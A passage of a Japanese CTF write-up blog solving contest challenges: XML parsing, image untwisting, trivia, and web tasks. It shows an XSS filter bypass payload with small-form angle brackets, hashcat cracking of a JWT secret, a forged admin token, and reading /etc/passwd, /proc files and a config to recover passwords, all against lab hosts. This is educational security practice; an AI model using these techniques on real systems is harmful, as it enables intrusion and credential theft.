class="string">&quot;coffee&quot;</span> candy:weight=<span class="string">&quot;3.3636170g&quot;</span> candy:shape=<span class="string">&quot;sphere&quot;</span> /&gt;</span><br><span class="line">        &lt;sweets:cookie cookie:<span class="built_in">id</span>=<span class="string">&quot;0xFB7C6DE7&quot;</span> cookie:kind=<span class="string">&quot;checker&quot;</span> cookie:radius=<span class="string">&quot;3.2564663cm&quot;</span>&gt;flag&#123;TkzPn3ZKL28zJXn7&#125;&lt;/sweets:cookie&gt;</span><br><span class="line">        &lt;sweets:cookie cookie:<span class="built_in">id</span>=<span class="string">&quot;0x26C3166A&quot;</span> cookie:kind=<span class="string">&quot;icing&quot;</span> cookie:radius=<span class="string">&quot;3.0929699cm&quot;</span>&gt;flag&#123;MbfkAZTVpc6bMrz9&#125;&lt;/sweets:cookie&gt;</span><br><span class="line">    &lt;/sweets:batch&gt;</span><br></pre></td></tr></table></figure>

<p>割と良いコードを書いてくれたのだが、namespaceの部分が正しくなかったので手修正。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import xml.etree.ElementTree as ET</span></span><br><span class="line"><span class="keyword">import</span> lxml.etree <span class="keyword">as</span> ET</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_sweets</span>(<span class="params">file</span>):</span><br><span class="line">    tree = ET.parse(file)</span><br><span class="line">    root = tree.getroot()</span><br><span class="line"></span><br><span class="line">    max_radius = <span class="number">0</span></span><br><span class="line">    max_cookie = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> batch <span class="keyword">in</span> root.findall(<span class="string">&quot;.//sweets:batch&quot;</span>, root.nsmap):</span><br><span class="line">        icecreams = batch.findall(<span class="string">&quot;.//sweets:icecream&quot;</span>, root.nsmap)</span><br><span class="line">        candies = batch.findall(<span class="string">&quot;.//sweets:candy&quot;</span>, root.nsmap)</span><br><span class="line">        cookies = batch.findall(<span class="string">&quot;.//sweets:cookie&quot;</span>, root.nsmap)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1. 少なくとも二つの子要素 sweets:icecream が含まれる</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(icecreams) &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. 子要素 sweets:icecream には icecream:amount 属性の値が 105g を下回るものがない</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(</span><br><span class="line">            <span class="built_in">float</span>(</span><br><span class="line">                ic.get(<span class="string">&quot;&#123;http://xml.vlc-cybercontest.com/icecream&#125;amount&quot;</span>).rstrip(<span class="string">&quot;g&quot;</span>)</span><br><span class="line">            )</span><br><span class="line">            &lt; <span class="number">105</span></span><br><span class="line">            <span class="keyword">for</span> ic <span class="keyword">in</span> icecreams</span><br><span class="line">        ):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3. 子要素 sweets:candy の candy:weight 属性の値の合計が 28.0g 以上である</span></span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            <span class="built_in">sum</span>(</span><br><span class="line">                <span class="built_in">float</span>(</span><br><span class="line">                    c.get(<span class="string">&quot;&#123;http://xml.vlc-cybercontest.com/candy&#125;weight&quot;</span>).rstrip(<span class="string">&quot;g&quot;</span>)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> candies</span><br><span class="line">            )</span><br><span class="line">            &lt; <span class="number">28.0</span></span><br><span class="line">        ):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 4. 子要素 sweets:candy の candy:shape 属性が 5 種類以上含まれる</span></span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            <span class="built_in">len</span>(</span><br><span class="line">                <span class="built_in">set</span>(</span><br><span class="line">                    c.get(<span class="string">&quot;&#123;http://xml.vlc-cybercontest.com/candy&#125;shape&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> c <span class="keyword">in</span> candies</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">            &lt; <span class="number">5</span></span><br><span class="line">        ):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> cookie <span class="keyword">in</span> cookies:</span><br><span class="line">            <span class="comment"># 5. cookie:kind 属性が icing であり...</span></span><br><span class="line">            <span class="keyword">if</span> cookie.get(<span class="string">&quot;&#123;http://xml.vlc-cybercontest.com/cookie&#125;kind&quot;</span>) == <span class="string">&quot;icing&quot;</span>:</span><br><span class="line">                radius = <span class="built_in">float</span>(</span><br><span class="line">                    cookie.get(<span class="string">&quot;&#123;http://xml.vlc-cybercontest.com/cookie&#125;radius&quot;</span>).rstrip(</span><br><span class="line">                        <span class="string">&quot;cm&quot;</span></span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">                <span class="comment"># かつ cookie:radius 属性が 3.0cm 以上の子要素 sweets:cookie を少なくとも一つ含む</span></span><br><span class="line">                <span class="keyword">if</span> radius &gt;= <span class="number">3.0</span>:</span><br><span class="line">                    [</span><br><span class="line">                        <span class="built_in">print</span>(ET.tostring(cookie, encoding=<span class="string">&quot;unicode&quot;</span>))</span><br><span class="line">                        <span class="keyword">for</span> cookie <span class="keyword">in</span> cookies</span><br><span class="line">                    ]</span><br><span class="line"></span><br><span class="line">parse_sweets(<span class="string">&quot;sweets.xml&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>↓の実行結果を上から試すとフラグだった。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">% python solve.py</span><br><span class="line">&lt;sweets:cookie xmlns:sweets=<span class="string">&quot;http://xml.vlc-cybercontest.com/sweets&quot;</span> xmlns:cookie=<span class="string">&quot;http://xml.vlc-cybercontest.com/cookie&quot;</span> xmlns:icecream=<span class="string">&quot;http://xml.vlc-cybercontest.com/icecream&quot;</span> xmlns:candy=<span class="string">&quot;http://xml.vlc-cybercontest.com/candy&quot;</span> cookie:<span class="built_in">id</span>=<span class="string">&quot;0x6937BAA7&quot;</span> cookie:kind=<span class="string">&quot;languedechat&quot;</span> cookie:radius=<span class="string">&quot;3.1418079cm&quot;</span>&gt;**flag&#123;sZ8d5FbntXbL9uwP&#125;**&lt;/sweets:cookie&gt;</span><br><span class="line"></span><br><span class="line">&lt;sweets:cookie xmlns:sweets=<span class="string">&quot;http://xml.vlc-cybercontest.com/sweets&quot;</span> xmlns:cookie=<span class="string">&quot;http://xml.vlc-cybercontest.com/cookie&quot;</span> xmlns:icecream=<span class="string">&quot;http://xml.vlc-cybercontest.com/icecream&quot;</span> xmlns:candy=<span class="string">&quot;http://xml.vlc-cybercontest.com/candy&quot;</span> cookie:<span class="built_in">id</span>=<span class="string">&quot;0x19A83890&quot;</span> cookie:kind=<span class="string">&quot;checker&quot;</span> cookie:radius=<span class="string">&quot;3.0552874cm&quot;</span>&gt;flag&#123;QxNFv5q9gtnvaXEc&#125;&lt;/sweets:cookie&gt;</span><br><span class="line"></span><br><span class="line">&lt;sweets:cookie xmlns:sweets=<span class="string">&quot;http://xml.vlc-cybercontest.com/sweets&quot;</span> xmlns:cookie=<span class="string">&quot;http://xml.vlc-cybercontest.com/cookie&quot;</span> xmlns:icecream=<span class="string">&quot;http://xml.vlc-cybercontest.com/icecream&quot;</span> xmlns:candy=<span class="string">&quot;http://xml.vlc-cybercontest.com/candy&quot;</span> cookie:<span class="built_in">id</span>=<span class="string">&quot;0xB43E03AC&quot;</span> cookie:kind=<span class="string">&quot;icing&quot;</span> cookie:radius=<span class="string">&quot;3.1110701cm&quot;</span>&gt;flag&#123;YXBbN3zpqxJy8CvA&#125;&lt;/sweets:cookie&gt;</span><br><span class="line"></span><br><span class="line">&lt;sweets:cookie xmlns:sweets=<span class="string">&quot;http://xml.vlc-cybercontest.com/sweets&quot;</span> xmlns:cookie=<span class="string">&quot;http://xml.vlc-cybercontest.com/cookie&quot;</span> xmlns:icecream=<span class="string">&quot;http://xml.vlc-cybercontest.com/icecream&quot;</span> xmlns:candy=<span class="string">&quot;http://xml.vlc-cybercontest.com/candy&quot;</span> cookie:<span class="built_in">id</span>=<span class="string">&quot;0x9F045677&quot;</span> cookie:kind=<span class="string">&quot;checker&quot;</span> cookie:radius=<span class="string">&quot;3.0090029cm&quot;</span>&gt;flag&#123;28j3vnedw7BELQxU&#125;&lt;/sweets:cookie&gt;</span><br></pre></td></tr></table></figure>

<aside>
⛳ flag{sZ8d5FbntXbL9uwP}

</aside>

<h3><span id="twisted-text">Twisted Text</span></h3><img src="/img/2024/02-25/Untitled%2034.png" width="550px" height="auto">

<p>Copilot〜〜〜</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Twisted.png をピクセルごとに処理して、fixed-Twisted.png を作って保存してください。</span><br><span class="line"></span><br><span class="line">ただし、 Twisted.png は、画像の中心からの距離 r [pixel] に対して</span><br><span class="line"></span><br><span class="line">θ = - (r ^ <span class="number">2</span>) / (<span class="number">250</span> ^ <span class="number">2</span>) [rad]</span><br><span class="line">だけ回転されています(反時計回りを正とします)。逆変換を施して fixed-Twsited.png を作ってください。</span><br></pre></td></tr></table></figure>

<p>まあまあなコードを書いてくれたが、座標回転の式を間違えていたりした。修正したのが↓</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotate_image</span>(<span class="params">image_path, output_path</span>):</span><br><span class="line">    <span class="comment"># 画像を開く</span></span><br><span class="line">    img = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">    width, height = img.size</span><br><span class="line">    pixels = np.array(img)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 新しい画像のピクセルを格納する配列を作成</span></span><br><span class="line">    new_pixels = np.zeros_like(pixels)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 画像の中心を計算</span></span><br><span class="line">    center_x, center_y = width / <span class="number">2</span>, height / <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 各ピクセルに対して</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            <span class="comment"># 中心からの距離を計算</span></span><br><span class="line">            dx, dy = x - center_x, y - center_y</span><br><span class="line">            r = np.sqrt(dx**<span class="number">2</span> + dy**<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 角度を計算</span></span><br><span class="line">            theta =  -(r**<span class="number">2</span>) / (<span class="number">250</span>**<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 新しい位置を計算</span></span><br><span class="line">            new_x = center_x + (x - center_x) * np.cos(theta) - (y - center_y) * np.sin(theta)</span><br><span class="line">            new_y = center_y + (x - center_x) * np.sin(theta) + (y - center_y) * np.cos(theta)</span><br><span class="line"></span><br><span class="line"><span class="comment">#            print(f&quot;(&#123;x&#125;, &#123;y&#125;) -&gt; (&#123;new_x&#125;, &#123;new_y&#125;)&quot;)</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 新しい位置が画像の範囲内にある場合、ピクセルを移動</span></span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= new_x &lt; width <span class="keyword">and</span> <span class="number">0</span> &lt;= new_y &lt; height:</span><br><span class="line">                new_pixels[<span class="built_in">int</span>(new_y), <span class="built_in">int</span>(new_x)] = pixels[y, x]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 新しい画像を作成して保存</span></span><br><span class="line">    new_img = Image.fromarray(new_pixels)</span><br><span class="line">    new_img.save(output_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 関数を呼び出す</span></span><br><span class="line">rotate_image(<span class="string">&quot;Twisted.png&quot;</span>, <span class="string">&quot;fixed-Twisted.png&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>出力画像は↓</p>
<img src="/img/2024/02-25/Untitled%2035.png" width="auto" height="auto">

<aside>
⛳ flag{LHZGhq3WTXvo}

</aside>

<h2><span id="trivia">Trivia</span></h2><h3><span id="the-original-name-of-aes">The Original Name of AES</span></h3><img src="/img/2024/02-25/Untitled%2036.png" width="550px" height="auto">

<aside>
⛳ flag{Rijndael}

</aside>

<h3><span id="cve-record-of-lowest-number">CVE Record of Lowest Number</span></h3><img src="/img/2024/02-25/Untitled%2037.png" width="550px" height="auto">

<p>ググると、CVEは1999年から始まった模様。ということは CVE-1999-0001 かな？</p>
<p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-1999-0001">https://nvd.nist.gov/vuln/detail/CVE-1999-0001</a></p>
<p>ありました。exploitがありそうなリンクを辿ると↓を発見。</p>
<p><a target="_blank" rel="noopener" href="https://ftp.openbsd.org/pub/OpenBSD/patches/2.3/common/tcpfix.patch">https://ftp.openbsd.org/pub/OpenBSD/patches/2.3/common/tcpfix.patch</a></p>
<p>パッチ中のファイル名から、</p>
<aside>
⛳ flag{ip_input.c}

</aside>

<h3><span id="mfa-factors">MFA Factors</span></h3><img src="/img/2024/02-25/Untitled%2038.png" width="550px" height="auto">

<p>あーあれでしょ？あれあれ</p>
<ul>
<li>知識</li>
<li>体</li>
<li>所有</li>
</ul>
<p>なんかうろ覚え… ググって回答。</p>
<aside>
⛳ flag{所持・生体・知識}

</aside>

<h2><span id="web">Web</span></h2><h3><span id="browsers-have-local-storage">Browsers Have Local Storage</span></h3><img src="/img/2024/02-25/Untitled%2039.png" width="550px" height="auto">

<p><code>/</code> から読まれているJSファイルにフラグあり。</p>
<img src="/img/2024/02-25/Untitled%2040.png" width="auto" height="auto">

<aside>
⛳ FLAG{Th1s_1s_The_fIrst_flag}

</aside>

<h3><span id="are-you-introspective">Are You Introspective?</span></h3><img src="/img/2024/02-25/Untitled%2041.png" width="550px" height="auto">

<p>Burp Suite Certified Practitioner 資格の練習で死ぬほどやった。</p>
<p><a target="_blank" rel="noopener" href="https://laysakura.notion.site/Web-hack-Recon-044e89072597493b93e00cfd530019bb#eab8dcf67d7f4e8e8920fbb6e96d255f">Fuzz: Information disclosure &#x2F; Access control &#x2F; GraphQL (hidden api) &#x2F; JWT &#x2F; OAuth - Notion</a></p>
<p>ここのエンドポイント候補をBurp Intruderでバババと試すと、 <code>/v1/graphql</code> でいい感じのレスポンスが返ってくる。</p>
<p>ブラウザでアクセスすると、勝手にイントロスペクションクエリをPOSTで投げてくれる。Graph<em>i</em>QLのJSがやってくれてるのかな？</p>
<p>POSTのレスポンスにフラグが含まれている。</p>
<img src="/img/2024/02-25/Untitled%2042.png" width="auto" height="auto">

<aside>
⛳ FLAG{Is_this_your_first_time_using_GraphQL}

</aside>

<h3><span id="insecure">Insecure</span></h3><img src="/img/2024/02-25/Untitled%2043.png" width="550px" height="auto">

<p>まずは与えられた testUser でログイン。</p>
<p>ポチポチやって、プロフィールを表示。こんな感じのリクエスト→レスポンス。</p>
<img src="/img/2024/02-25/Untitled%2044.png" width="auto" height="auto">

<p>無邪気に <code>id=0</code> とやってRepeatすると、 <code>profile_error.php</code> にリダイレクトされてしまう。</p>
<img src="/img/2024/02-25/Untitled%2045.png" width="auto" height="auto">

<p>（色々試行錯誤してふと気づく）これ、失敗はしても <code>profile_success.php</code> は裏側の処理で生成されているのでは？ユーザーごとにスコーピングしてないかも。と思い至る。</p>
<p>ビンゴ。</p>
<img src="/img/2024/02-25/Untitled%2046.png" width="auto" height="auto">

<p>ボディの下の方にフラグがある（個人情報に見える文字列見えちゃうので上だけ切り出した）。</p>
<aside>
⛳ FLAG{1qaz7ujmbgt5}

</aside>

<h3><span id="variation-解けなかった">Variation (解けなかった 😭)</span></h3><img src="/img/2024/02-25/Untitled%2047.png" width="550px" height="auto">

<p><code>&lt;</code> と <code>&gt;</code> が消されてしまうので、JSを書ける文脈に持ち込めない。全角の <code>＜</code> など色々試すがうまくいかず。</p>
<p><a target="_blank" rel="noopener" href="https://nanimokangaeteinai.hateblo.jp/entry/2024/02/25/210059#Web-20-Variation-6-solves">防衛省サイバーコンテスト 2024 writeup - st98 の日記帳 - コピー</a></p>
<p>のwriteup見ると、UTF-8ということで3バイト総当たりしている。賢い…</p>
<p><code>﹤</code> と <code>﹥</code> が使える模様。</p>
<p><a target="_blank" rel="noopener" href="http://10.10.10.32/greet?name=%EF%B9%A4script%EF%B9%A5alert(1)%EF%B9%A4/script%EF%B9%A5">http://10.10.10.32/greet?name=﹤script﹥alert(1)﹤/script﹥</a></p>
<p>でフラグゲット。</p>
<img src="/img/2024/02-25/Untitled%2048.png" width="auto" height="auto">

<aside>
⛳ FLAG{dfa23afjkl98}

</aside>

<h3><span id="bruteforce">Bruteforce</span></h3><img src="/img/2024/02-25/Untitled%2049.png" width="550px" height="auto">

<p>好きな問題。</p>
<p>:8000 の方はBasic認証の手がかりがないので、 :5000 の方をソースから見てみる。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> jsonify</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask_jwt_extended <span class="keyword">import</span> create_access_token</span><br><span class="line"><span class="keyword">from</span> flask_jwt_extended <span class="keyword">import</span> get_jwt_identity</span><br><span class="line"><span class="keyword">from</span> flask_jwt_extended <span class="keyword">import</span> jwt_required</span><br><span class="line"><span class="keyword">from</span> flask_jwt_extended <span class="keyword">import</span> JWTManager</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&quot;JWT_SECRET_KEY&quot;</span>] = <span class="string">&quot;*************&quot;</span></span><br><span class="line">app.config[<span class="string">&quot;JWT_ACCESS_TOKEN_EXPIRES&quot;</span>] = <span class="literal">False</span></span><br><span class="line">app.config[<span class="string">&quot;JWT_REFRESH_TOKEN_EXPIRES&quot;</span>] = <span class="literal">False</span></span><br><span class="line">app.config[<span class="string">&quot;JWT_COOKIE_CSRF_PROTECT&quot;</span>] = <span class="literal">False</span></span><br><span class="line">app.config[<span class="string">&quot;JWT_ENCODE_NBF&quot;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">jwt = JWTManager(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    users = &#123;&#125;</span><br><span class="line">    users[<span class="string">&#x27;test&#x27;</span>] = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">    users[<span class="string">&#x27;admin&#x27;</span>] = <span class="string">&#x27;*************&#x27;</span></span><br><span class="line">    username = request.json.get(<span class="string">&quot;username&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="built_in">print</span>(username)</span><br><span class="line">    password = request.json.get(<span class="string">&quot;password&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="built_in">print</span>(password)</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> username <span class="keyword">in</span> users) <span class="keyword">or</span> (password != users[username]):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Bad username or password&quot;</span>&#125;), <span class="number">401</span></span><br><span class="line"></span><br><span class="line">    access_token = create_access_token(identity=username)</span><br><span class="line">    <span class="keyword">return</span> jsonify(access_token=access_token)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/protected&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@jwt_required()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">protected</span>():</span><br><span class="line">    current_user = get_jwt_identity()</span><br><span class="line">    <span class="keyword">if</span> current_user == <span class="string">&quot;test&quot;</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ummm....&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> current_user == <span class="string">&quot;admin&quot;</span> :</span><br><span class="line">        filepath = request.json.get(<span class="string">&quot;filepath&quot;</span>,<span class="literal">None</span>)</span><br><span class="line">        f = <span class="built_in">open</span>(filepath,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        filedata = f.read()</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">return</span> jsonify(filedata), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>JWT問題とわかる。とりえあず <code>test:test</code> でログインできそうなのでリクエスト。</p>
<img src="/img/2024/02-25/Untitled%2050.png" width="auto" height="auto">

<p>JWTのアクセストークンがもらえた。これを Authorization ヘッダに使って <code>/protected</code> にアクセスしてみる。</p>
<img src="/img/2024/02-25/Untitled%2051.png" width="auto" height="auto">

<p>ソースから期待されるように、 ummmm してもらった。</p>
<p>JWTの中身はこんな感じ。</p>
<img src="/img/2024/02-25/Untitled%2052.png" width="auto" height="auto">

<p><a target="_blank" rel="noopener" href="https://laysakura.notion.site/Web-hack-Exploit-2c68c0d3131c427aab94e82ae49366ec#8fbb303a58be4c769720f3e5cd072861">[server] JWT attacks - Notion</a> にまとめたいろいろな攻撃を試すが、問題タイトル的にも本命は <a target="_blank" rel="noopener" href="https://laysakura.notion.site/Web-hack-Exploit-2c68c0d3131c427aab94e82ae49366ec#86d4ae8ce83e4d0cb4e3f80a0e4050a4">Exploit: 秘密鍵にbrute force &#x2F; 辞書攻撃 - Notion</a> 。</p>
<p>先ほど得た <code>test:test</code> のJWTで秘密鍵を探す。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% hashcat -a <span class="number">0</span> -m <span class="number">16500</span> <span class="string">&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcwODg0OTA1NSwianRpIjoiMGZkY2NlZjQtZmFmNi00ZjQ1LThiODgtNWU4Y2VhMWZhOTlkIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3QifQ.G5nYLH6uv37IdJRGw9FFrDBa_TBGliO4dlKsFvEVzcQ&#x27;</span> /usr/share/wordlists/rockyou.txt --show</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcwODg0OTA1NSwianRpIjoiMGZkY2NlZjQtZmFmNi00ZjQ1LThiODgtNWU4Y2VhMWZhOTlkIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3QifQ.G5nYLH6uv37IdJRGw9FFrDBa_TBGliO4dlKsFvEVzcQ:**conankun**</span><br></pre></td></tr></table></figure>

<p><code>conankun</code> がキー<code>。</code></p>
<p>これ使って、 <code>&quot;sub&quot;</code> を <code>admin</code> に変えたJWTを作って送信するも、500…</p>
<img src="/img/2024/02-25/Untitled%2053.png" width="auto" height="auto">

<hr>
<p>改めてコードを読むと、リクエストボディのJSONに <code>filepath</code> を指定しないと確かにサーバーエラーになりそう。</p>
<p>しかしフラグのpathがわからない。</p>
<p>一旦 <code>&#123;&quot;filepath&quot;: &quot;/etc/passwd&quot;&#125;</code> とかにすると、ちゃんと中身がレスポンスされる。</p>
<p>ファイルreadからフラグパス情報収集となると、うーん <code>/proc/self/</code> 使えるかなぁ。</p>
<p><code>/proc/self/cmdline</code> から :5000 のサーバーのコードの場所がわかり、</p>
<img src="/img/2024/02-25/Untitled%2054.png" width="auto" height="auto">

<p>それを読むことで本物の <code>admin</code> のパスワードが <code>EyS9$Ww4nhx)</code> であることが追加でわかったりしたが、特に正解に近づくものではなかった。</p>
<p>他のプロセスも見るかということで、 <code>/proc/1/cmdline</code> から眺める。</p>
<img src="/img/2024/02-25/Untitled%2055.png" width="auto" height="auto">

<p>お、supervisord.confが気になる。</p>
<img src="/img/2024/02-25/Untitled%2056.png" width="auto" height="auto">

<p>なんかパスワードある！これが :8000 のbasic認証のパスワードだった。Basic認証突破するとフラグがディレクトリ名になっていた。</p>
<img src="/img/2024/02-25/Untitled%2057.png" width="auto" height="auto">

<aside>
⛳ FLAG{pLi5lfm8hJK7}

</aside>

    
  </div>
  <footer class="entry-footer">
    <div class="entry-meta-footer">
      <span class="category">
        
      </span>
      <span class="tags">
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3/" rel="tag">セキュリティ</a></li></ul>

      </span>
    </div>
  </footer>
  
  <footer class="author-info clearfix">
    <img class="author-picture circle" src="https://www.gravatar.com/avatar/cb02a2b3f429b7c938d1fe2665e8e342">
    <div class="author-content right">
      <div class="author-caption">
        <span class="label">author</span>
        Sho Nakatani a.k.a. laysakura
      </div>
      <p class="author-description">
        東京大学大学院 情報理工学系研究科 電子情報学専攻 修士課程で並列分散処理・ストリーム処理・データベースを研究。<br>
